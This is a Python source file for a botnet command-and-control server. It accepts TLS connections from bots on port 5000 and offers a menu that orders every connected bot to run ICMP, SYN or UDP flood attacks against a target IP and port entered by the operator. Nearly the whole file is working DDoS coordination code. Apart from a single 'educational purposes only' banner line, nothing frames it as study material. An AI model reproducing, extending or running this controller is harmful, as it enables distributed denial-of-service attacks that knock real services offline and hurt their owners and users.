import socket
import ssl
from threading import Thread
from colorama import Fore, Style, init

init()  # Initialize colorama

connected_bots = {}

def display_banner():
    banner_text = r"""
   ____  _   _ ____  
  / ___|| \ | |  _ \ 
 | |    |  \| | | | |
 | |___ | |\  | |_| |
  \____||_| \_|____/ 
                      
    """
    print(Fore.CYAN + banner_text + Style.RESET_ALL)
    print(Fore.YELLOW + "Cyber Bot Network (CYB) - Command Center" + Style.RESET_ALL)
    print(Fore.RED + "Ensure this is used in a controlled environment for educational purposes only.\n" + Style.RESET_ALL)

def handle_bot(conn, addr):
    bot_address = f"{addr[0]}:{addr[1]}"
    connected_bots[bot_address] = conn
    print(f"{Fore.GREEN}Secure bot {bot_address} connected and ready.{Style.RESET_ALL}")
    try:
        while True:
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break
            print(f"Received from {bot_address}: {data}")
    finally:
        if bot_address in connected_bots:
            del connected_bots[bot_address]
        conn.close()
        print(f"Bot {bot_address} disconnected.")

def user_commands():
    while True:
        print("\nMenu:")
        print("1. List connected bots")
        print("2. ICMP flood attack (Network Layer)")
        print("3. SYN flooding attack (Transport Layer)")
        print("4. UDP flooding attack (Transport Layer)")
        print("5. Stop DDoS")
        print("6. Exit")
        cmd = input("Enter your choice: ").strip()

        if cmd == '1':
            print("Currently connected bots:")
            for bot in connected_bots.keys():
                print(bot)
        elif cmd == '2':
            target_ip = input("Enter target IP for ICMP flood attack: ").strip()
            for bot_address, conn in connected_bots.items():
                conn.sendall(f"EXECUTE_ICMP_ATTACK {target_ip}".encode())
                print(f"ICMP flood command sent to {bot_address}")
        elif cmd == '3':
            target_ip = input("Enter target IP for SYN flooding attack: ").strip()
            target_port = input("Enter target Port for SYN flooding attack: ").strip()
            for bot_address, conn in connected_bots.items():
                conn.sendall(f"EXECUTE_SYN_FLOOD_ATTACK {target_ip} {target_port}".encode())
                print(f"SYN flooding attack command sent to {bot_address}")
        elif cmd == '4':
            target_ip = input("Enter target IP for UDP flooding attack: ").strip()
            target_port = input("Enter target Port for UDP flooding attack: ").strip()
            for bot_address, conn in connected_bots.items():
                conn.sendall(f"EXECUTE_UDP_FLOOD_ATTACK {target_ip} {target_port}".encode())
                print(f"UDP flooding attack command sent to {bot_address}")
        elif cmd == '5':
            for bot_address, conn in connected_bots.items():
                conn.sendall("STOP_DDoS".encode())
                print(f"Stop DDoS command sent to {bot_address}")
        elif cmd == '6':
            print("Exiting...")
            break

def start_master_bot(certfile='cert.pem', keyfile='key.pem'):
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)  # Corrected variable name here
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(('0.0.0.0', 5000))
        sock.listen(5)
        with context.wrap_socket(sock, server_side=True) as ssock:
            print("Master bot running securely. Waiting for bot connections...")
            Thread(target=user_commands, daemon=True).start()
            try:
                while True:
                    conn, addr = ssock.accept()
                    Thread(target=handle_bot, args=(conn, addr)).start()
            except KeyboardInterrupt:
                print("Master bot is shutting down...")

if __name__ == "__main__":
    display_banner()
    start_master_bot()
